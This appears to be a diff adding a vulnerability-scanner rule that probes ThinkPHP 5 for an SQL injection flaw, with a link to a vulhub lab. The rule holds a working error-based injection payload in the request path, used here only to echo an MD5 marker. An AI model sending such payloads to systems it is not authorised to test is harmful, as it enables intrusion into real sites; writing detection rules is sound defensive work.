@@ -1,0 +1,12 @@
+name: thinkphp5-in-sqlinjection
+rules:
+  - method: GET
+    path: /index.php?ids[0,updatexml(0,concat(0xa,MD5(8888)),0)]=1
+    expression: |
+      body.bcontains(b'cf79ae6addba60ad018347359bd144d')
+detail:
+  author: 17bdw
+  Affected Version: "thinkphp5-in-sqlinjection"
+  vuln_url: "/index.php?ids[0,updatexml(0,concat(0xa,MD5(8888)),0)]=1"
+  links:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection
